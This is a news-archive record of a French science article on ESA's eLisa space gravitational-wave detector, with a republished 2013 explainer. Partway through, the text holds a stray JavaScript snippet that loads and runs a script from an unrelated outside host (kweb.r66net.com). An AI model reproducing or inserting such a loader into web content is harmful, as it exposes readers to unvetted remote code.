{"title": "Ondes gravitationnelles : la mission eLisa entre dans une nouvelle phase", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-06-21", "content": "C'est fait, l'ESA vient de confirmer son interet pour la mission eLisa, anciennement appelee Lisa. Celle-ci consiste a mettre en orbite un equivalent du detecteur d'ondes gravitationnelles aLigo sous forme de trois satellites deployes en formation triangulaire. Leurs distances relatives seront mesurees avec des faisceaux lasers. Malgre tout, le projet n'est pas encore adopte, ce qui veut dire que leur construction n'est pas encore acceptee. Ce qu'il faut retenir Le reve d'un detecteur geant d'ondes gravitationnelles dans l'espace vient de se rapprocher un peu plus de la realite. L'ESA vient de faire savoir qu'elle avait effectivement selectionne la mission eLisa, anciennement appelee Lisa, qui devrait nous faire penetrer dans le monde de l'astronomie gravitationnelle avec les trous noirs supermassifs. On peut s'attendre a ce que dans une prochaine phase de son deroulement, la mission eLisa soit adoptee par l'ESA. Les trois satellites pourraient etre lances en 2034. Interview : comment mesurer les ondes gravitationnelles ?                       Les ondes gravitationnelles sont des deformations de l'espace-temps predites par Einstein. Il serait possible de les mesurer avec des outils appropries. L'editeur litteraire Dunod a interviewe Pierre Binetruy, professeur au laboratoire Astroparticule et Cosmologie de l'universite Paris Diderot, afin d'en savoir plus sur ces mysterieuses ondes et sur la facon dont on pourrait les detecter.                                       L' ESA  vient de faire savoir dans un communique qu'elle continuait a soutenir les etudes preparatoires menant a la construction des trois satellites du projet eLisa ( Evolved Laser Interferometer Space Antenna ). Sa mission dans l'espace devrait debuter a l'horizon des annees 2030. Rappelons que ce projet de detections des  ondes gravitationnelles  dans une  bande de frequences  qui est inaccessible aux detecteurs sur  Terre  comme aLigo,  Virgo  et  Kagra , devait s'appeler a l'origine  Lisa  et etre developpe conjointement avec la Nasa. Le projet eLisa n'est donc pas encore adopte, au contraire du  chasseur d'exoplanetes Plato , ce qui veut dire que la construction des trois satellites prevus n'est pas encore acceptee et encore moins lancee. Cependant, tout semble se presenter pour le mieux, etant donne que la detection des ondes gravitationnelles est passee du reve a la realite comme l'a encore montre recemment la troisieme mise en evidence des ondes emises par la  fusion  de deux  trous noirs stellaires . Voir aussi : Ondes gravitationnelles : une troisieme fusion de trous noirs detectee par Ligo Bien que predites par Einstein, celles-ci restent difficiles a detecter car elles demandent des outils d'une sensibilite extreme. L'ESA travaille actuellement sur un nouveau systeme de mesures avec le projet Lisa Pathfinder, un satellite qui pourrait bientot mener a de grandes decouvertes. Apprenez-en un peu plus avec cette video du Cnes. (c) Cnes La mission eLisa, l'avenir de l'astronomie gravitationnelle Enfin, la mission Lisa Pathfinder, qui etait destinee non pas a commencer a detecter des ondes gravitationnelles depuis l'espace mais a tester diverses technologies prevues pour le bon fonctionnement d'eLisa, s'est deroulee mieux que prevu. On peut donc etre optimiste et s'attendre a ce que le projet eLisa, selectionne en tant que mission L3 dans le cadre des missions lourdes du programme  Cosmic Vision  de l'ESA, entre en fonctionnement apres son lancement en 2034.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Helas, le physicien et theoricien  Pierre Binetruy  n'est plus avec nous et il ne pourra donc pas voir le bond que devrait faire l'astronomie gravitationnelle (et peut-etre au passage la  physique  fondamentale) avec le debut de la mission eLisa pour laquelle il s'est beaucoup investi. Dans un entretien qu'il avait accorde a Futura, il nous avait explique qu'avec  eLisa , on allait pouvoir mettre en evidence les ondes gravitationnelles emises par la fusion des  trous noirs supermassifs  et aussi, celles que generent ces monstres de plusieurs millions a milliards de  masses  solaires quand ils avalent des trous noirs de type stellaire. Mais pour cela, comme nous l'expliquions en decembre 2013 dans l'article ci-dessous, il faut mesurer des variations des distances dans l'espace tres petites dues aux passages des ondes gravitationnelles, une tache qui necessite des satellites separes par environ un million de kilometres et echangent entre eux des rayons laser afin de determiner leurs distances relatives.  Les observations realisees devraient nous permettre de tester la theorie des trous noirs, celle de la  relativite generale , car il existe des alternatives aux  equations  decouvertes il y a presque un siecle par  Einstein , et peut-etre meme nous donner des renseignements sur la toujours enigmatique theorie de la  gravitation quantique , laquelle reste le Graal de la physique fondamentale. Pour en savoir plus  En video : decouvrez eLisa, la future mission d'astronomie gravitationnelle Article de  Laurent Sacco  publie le 07/12/2013 Comment sont nes et ont evolue les  trous noirs supermassifs  au centre des  galaxies  ? D'ailleurs, s'agit-il bien des trous noirs predits par la theorie de la relativite generale d'Einstein ? L'Esa a confirme qu'elle entendait repondre a ces questions et a d'autres du ressort de l'astronomie gravitationnelle avec la mission eLisa ( evolved Laser Interferometer Space Antenna ). Plusieurs videos pedagogiques permettent de mieux faire connaissance avec les principes de cette nouvelle astronomie, et bien sur avec eLisa. L' Esa  a recemment confirme que l'un de ses deux themes majeurs d'etude pour les deux prochaines decennies etait bien l'astronomie gravitationnelle depuis l'espace avec la mission  eLisa  ( evolved Laser Interferometer Space Antenna ). Jadis, la Nasa etait partie prenante de cette extraordinaire aventure destinee a ouvrir une nouvelle  fenetre  d'observation sur les trous noirs supermassifs, et peut-etre le  Big Bang  lui-meme. Depuis son retrait en 2011, c'est l'Esa seule qui continue a financer la mission Lisa, devenue depuis eLisa. Il est prevu de tester la technologie necessaire avec Lisa Pathfinder, qui sera lancee par une fusee  Vega  de l'Esa en 2015 si tout va bien. Mais les trois satellites equipes de  lasers  d'eLisa ne s'elanceront pas vers les  etoiles  avant 2034. On n'ose imaginer ce que doivent ressentir les pionniers des annees 1990 de la mission Lisa, tel  Kip Thorne , qui etait autrefois prevue a l'horizon des annees 2010. Courte presentation de la mission eLisa, anciennement appelee Lisa. Il s'agit d'etudier les emissions d'ondes gravitationnelles produites par des systemes binaires comme celui forme par une naine blanche accretant de la matiere, le Big Bang lui-meme et surtout les trous noirs. Pour plus de details sur le fonctionnement d'eLisa, visionnez l'episode 3 de  Gravity Ink.  ci-dessous. (c) LISA Mission, YouTube L'espace-temps, un tissu elastique qui peut vibrer Comme le rappelle la video ci-dessous, c'est Albert Einstein qui a decouvert que la gravitation de  Newton  etait une consequence de la courbure de l' espace-temps  en presence de distributions d' energie  et d'impulsion. On peut se representer le phenomene avec une surface elastique capable de se deformer et de vibrer comme la membrane d'un tambour. Des 1917,  Einstein  en avait conclu qu'il devait exister l'analogue des  ondes electromagnetiques  dans le << tissu elastique >> de l'espace-temps : des  ondes gravitationnelles . Comme il n'existe pas d'equivalent des charges positives et negatives avec la theorie d'Einstein, les ondes gravitationnelles ne peuvent pas etre ecrantees comme des ondes electromagnetiques. Elles sont donc tres penetrantes et peuvent servir a sonder bien des phenomenes faisant intervenir des objets  astrophysiques  tres denses, comme les  etoiles a neutrons , et meme cosmologiques, quand l' univers  lui-meme etait opaque aux ondes lumineuses.  Introduction a la relativite generale d'Einstein dans le premier episode de  Gravity Ink.  Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle avec deux barres horizontales en bas a droite. Les sous-titres en anglais devraient alors apparaitre, si ce n'est pas deja le cas. En passant simplement la souris sur le rectangle, vous devriez voir l'expression << Traduire les sous-titres >>. Cliquez pour faire apparaitre le menu du choix de la langue, choisissez << Francais >>, puis cliquez sur << OK >>. (c) LISA Mission, YouTube On sait que les ondes gravitationnelles existent, mais nous n'avons que des preuves indirectes. On tente depuis des annees de les detecter sur Terre avec des  interferometres  a laser comme  Ligo et Virgo . Le principe de ces detecteurs est simple a comprendre, bien que difficile a mettre en oeuvre. Lorsque des ondes gravitationnelles se propagent, elles font varier les distances entre les objets en etirant et compressant l'espace. Cet effet est tres faible a grande distance de sources d'ondes gravitationnelles, comme un trou noir nouvellement forme en train de vibrer. Mais si l'on realise une experience d' interferometrie  avec des  lasers  voyageant sur de grandes distances, on peut mettre en evidence les  vibrations  de l'espace en reponse a la presence d'une onde gravitationnelle. L'astronomie gravitationnelle et eLisa  Ligo  et Virgo n'ont pour le moment rien detecte, mais on sait que pour avoir plus de chances de reussir a observer ces ondes gravitationnelles il faut s'affranchir du bruit de fond terrestre constitue des  ondes sismiques , ainsi que des variations du champ gravitationnel. C'est pourquoi eLisa consistera a realiser un interferometre avec trois satellites formant un triangle d'un million de kilometres de cote et echangeant entre eux des faisceaux laser (pour plus de details sur le fonctionnement d'eLisa, visionnez l'episode 3 de  Gravity Ink.  ci-dessous). Une video d'introduction a l'astronomie gravitationnelle, l'episode 2 de  Gravity Ink.  Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle avec deux barres horizontales en bas a droite. Pour obtenir des sous-titres en francais, suivre la procedure decrite dans la legende la video precedente. (c) LISA Mission, YouTube La bande de frequences ou s'effectueront les observations avec eLisa est comprise entre 0,1 mHz et 100 mHz. Selon les astrophysiciens, c'est une fenetre d'observation tres prometteuse pour l'astronomie gravitationnelle. Elle devrait permettre de recenser les  systemes binaires  avec des  astres  compacts dans la  Voie lactee . Il peut s'agir de systeme contenant des naines blanches, des  etoiles a neutrons  ou des trous noirs. On sait que ce sont des emetteurs d'ondes gravitationnelles, puisque c'est avec le  pulsar  binaire PSR B1913+16, ou << pulsar de Hulse et Taylor >>, decouvert en 1974 au  radiotelescope  d' Arecibo  par Joseph Taylor et Russell Hulse, que l'on a demontre indirectement l'existence de ces ondes. Son etude a mis en evidence une acceleration de la  periode orbitale  du systeme, signe que les deux corps voyaient leur  orbite  se resserrer en raison de la perte d'energie entrainee par l'emission de rayonnement gravitationnel. On attend du recensement de ces systemes binaires qu'ils nous aident a preciser la nature des  supernovae SN Ia  et des  sursauts  gamma. L'episode 3 de  Gravity Ink.  explique la technique de detection des ondes gravitationnelles par interferometrie laser avec Liso, Virgo et surtout eLisa (voir plus haut pour obtenir une traduction). (c) LISA Mission, YouTube De l'origine des trous noirs supermassifs a la physique du Big Bang Ce qui est probablement le coeur de la mission eLisa concerne les trous noirs. Dans le cadre de la relativite generale classique, ce sont des objets bien connus definis par l'existence d'un  horizon des evenements . On pourra consulter l'impressionnante monographie de Chandrasekhar a ce sujet,  The mathematical theory of black holes , pour s'en convaincre. Ce sont presque les seuls objets astrophysiques connus qui permettraient de tester les equations de la relativite generale d'Einstein en regime de champ particulierement intense, par exemple a l'occasion de la collision de deux trous noirs. En analysant les ondes gravitationnelles produites par une telle collision, on espere en particulier demontrer de facon incontestable l'existence d'un horizon des evenements et verifier que la  metrique de Kerr  decrit bien les trous noirs en rotation. Enfin, eLisa devrait pouvoir nous fournir des indications precieuses concernant l'origine des trous noirs supermassifs. Quelles pouvaient etre leurs graines, alors que l'univers etait tout juste en train de sortir des  ages sombres  ? Ces trous noirs ont-ils evolue principalement a la suite des fusions entre les premieres galaxies en coalescant a leur tour ? Autant de questions pour lesquelles nous n'avons pas encore de reponses nettes. Enfin, du fait du caractere tres penetrant des ondes gravitationnelles, elles pouvaient se propager dans l'univers observable a une epoque bien anterieure a celle de la  recombinaison , lorsque le  rayonnement fossile  a ete emis. Un fond d'ondes gravitationnelles cosmologiques doit exister et nous renseigner plus directement sur les evenements dans l'univers entre 10 -18  et 10 -10  seconde apres le Big Bang. Plus generalement, on peut aussi esperer trouver des signes d'une  nouvelle physique , verifier si les ondes gravitationnelles se propagent bien a la  vitesse de la lumiere  et meme tester l'hypothese d'une masse non nulle pour le graviton. Malheureusement, dans le meilleur des cas, il va falloir patienter jusqu'a la seconde moitie des annees 2030. ", "theme": "sciences"}